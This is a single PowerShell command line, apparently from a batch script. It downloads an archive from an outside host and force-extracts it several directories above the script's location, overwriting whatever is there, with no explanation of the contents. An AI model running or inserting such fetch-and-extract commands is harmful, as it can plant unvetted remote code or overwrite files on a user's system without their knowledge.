powershell "$t=[System.IO.Path]::GetTempFileName();Invoke-WebRequest -Uri https://ec.nyaser.tk/zip -OutFile $t;Expand-Archive -Force -Path $t -DestinationPath %~dp0..\..\..\..\..;ri $t;"||cmd/k